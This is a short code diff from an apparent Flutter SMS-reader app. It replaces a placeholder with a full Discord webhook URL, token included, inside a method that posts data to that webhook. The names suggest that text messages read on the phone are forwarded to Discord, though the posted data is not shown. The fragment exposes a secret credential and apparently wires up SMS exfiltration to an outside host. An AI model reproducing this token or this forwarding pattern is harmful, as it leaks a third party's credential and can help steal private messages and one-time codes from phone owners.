@@ -58,7 +58,7 @@ class _SMSReaderAppState extends State<SMSReaderApp> {
 
   Future<void> _sendToDiscordWebhook() async {
     final discordWebhookURL =
-        'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
+        'https://discord.com/api/webhooks/1165290854416646225/NFI2Puw2SYeWNetzEm9sr_KtCSjEA-6CS54hTQZDCy7LD-EYLuv0rM2oioO7ObazFZvU'; // Replace with your Discord webhook URL
 
     final response = await http.post(
       Uri.parse(discordWebhookURL),
